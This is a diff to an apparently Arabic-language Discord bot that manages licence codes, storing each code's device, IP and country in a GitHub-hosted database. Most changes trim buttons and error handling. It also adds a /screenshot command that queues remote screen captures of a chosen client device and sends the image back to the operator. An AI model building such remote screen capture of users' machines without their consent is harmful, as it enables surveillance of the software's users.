@@ -25,7 +25,6 @@ def keep_alive():
 
 keep_alive()
 
-# جلب المعلومات من متغيرات البيئة في Render
 TOKEN = os.getenv('TOKEN')
 GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
 REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
@@ -110,14 +109,6 @@ class ConfirmSaveView(discord.ui.View):
         else:
             await interaction.followup.send("❌ فشل الحفظ في غيت هب.", ephemeral=True)
 
-    @discord.ui.button(label="لا، إلغاء", style=discord.ButtonStyle.red, custom_id="save_codes_no")
-    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
-        try:
-            await interaction.message.delete()
-        except Exception:
-            pass
-        await interaction.response.send_message("❌ تم إلغاء العملية.", ephemeral=True)
-
 
 class CodesSubMenuView(discord.ui.View):
     def __init__(self):
@@ -164,22 +155,6 @@ class CodesSubMenuView(discord.ui.View):
             return
         view = BlacklistManagementView(b_codes)
         await interaction.followup.send("🚫 **الأكواد المحظورة (اختر لفك الحظر أو الحذف):**", view=view, ephemeral=True)
-
-    @discord.ui.button(label="⚡ توليد كود سريع", style=discord.ButtonStyle.primary, custom_id="sub_codes_gen", row=1)
-    async def gen_quick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if not db:
-            await interaction.followup.send("❌ فشل.", ephemeral=True)
-            return
-        if "codes" not in db:
-            db["codes"] = {}
-        new_code = generate_random_code()
-        db["codes"][new_code] = {"used": False, "device": None, "ip": None, "country": None}
-        if save_db(db, sha, url, headers, f"Quick generated code {new_code}"):
-            await interaction.followup.send(f"✨ **تم توليد وحفظ كود جديد بنجاح!**\n🔑 الكود: `{new_code}`", ephemeral=True)
-        else:
-            await interaction.followup.send("❌ فشل حفظ الكود.", ephemeral=True)
 
 
 class UnusedManagementView(discord.ui.View):
@@ -231,34 +206,26 @@ class BlacklistOptionsView(discord.ui.View):
     async def unban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
-        if not db:
-            await interaction.followup.send("❌ خطأ.", ephemeral=True)
-            return
+        if not db: return
         if self.code in db.get("blacklisted_codes", []):
             db["blacklisted_codes"].remove(self.code)
         if self.code in db.get("codes", {}):
             db["codes"][self.code]["used"] = False
             db["codes"][self.code]["device"] = None
         if save_db(db, sha, url, headers, f"Unban code {self.code}"):
-            await interaction.followup.send(f"✅ تم فك الحظر عن الكود `{self.code}` وإرجاعه متاحاً!", ephemeral=True)
-        else:
-            await interaction.followup.send("❌ فشل الحفظ.", ephemeral=True)
+            await interaction.followup.send(f"✅ تم فك الحظر عن الكود `{self.code}`!", ephemeral=True)
 
     @discord.ui.button(label="🗑️ حذف نهائي", style=discord.ButtonStyle.danger, custom_id="b_opt_delete")
     async def delete_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
-        if not db:
-            await interaction.followup.send("❌ خطأ.", ephemeral=True)
-            return
+        if not db: return
         if self.code in db.get("blacklisted_codes", []):
             db["blacklisted_codes"].remove(self.code)
         if self.code in db.get("codes", {}):
             del db["codes"][self.code]
-        if save_db(db, sha, url, headers, f"Permanently delete blacklisted code {self.code}"):
-            await interaction.followup.send(f"🗑️ تم حذف الكود المحظور `{self.code}` نهائياً!", ephemeral=True)
-        else:
-            await interaction.followup.send("❌ فشل الحفظ.", ephemeral=True)
+        if save_db(db, sha, url, headers, f"Delete blacklisted {self.code}"):
+            await interaction.followup.send(f"🗑️ تم حذف الكود المحظور `{self.code}`!", ephemeral=True)
 
 
 class DevicesSubMenuView(discord.ui.View):
@@ -496,6 +463,42 @@ async def reset_device(interaction: discord.Interaction, code: str):
     db["codes"][code]["country"] = None
     if save_db(db, sha, url, headers, f"Reset code: {code}"):
         await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)
+
+
+@client.tree.command(name="screenshot", description="التقاط لقطة شاشة (Screenshot) لجهاز عميل معين عبر اسمه أو كوده")
+@app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
+async def screenshot_command(interaction: discord.Interaction, target: str):
+    await interaction.response.defer(thinking=True, ephemeral=True)
+    db, sha, url, headers = fetch_db()
+    if not db:
+        await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
+        return
+
+    target_upper = target.strip().upper()
+    target_clean = target.strip()
+    
+    found_key = None
+    if target_upper in db.get("codes", {}):
+        found_key = target_upper
+    else:
+        for c, info in db.get("codes", {}).items():
+            if info.get("device") and target_clean.lower() in info.get("device").lower():
+                found_key = c
+                break
+
+    if not found_key:
+        await interaction.followup.send(f"❌ لم يتم العثور على الجهاز أو الكود: `{target}`", ephemeral=True)
+        return
+
+    if "remote_screenshots" not in db:
+        db["remote_screenshots"] = {}
+    
+    db["remote_screenshots"][found_key] = {"id": str(int(time.time()))}
+    
+    if save_db(db, sha, url, headers, f"Request screenshot for target {found_key}"):
+        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!** سيصلك ملف الصورة هنا خلال لحظات لجهاز الكود: `{found_key}`", ephemeral=True)
+    else:
+        await interaction.followup.send("❌ فشل إرسال أمر التقاط الشاشة.", ephemeral=True)
 
 
 @client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
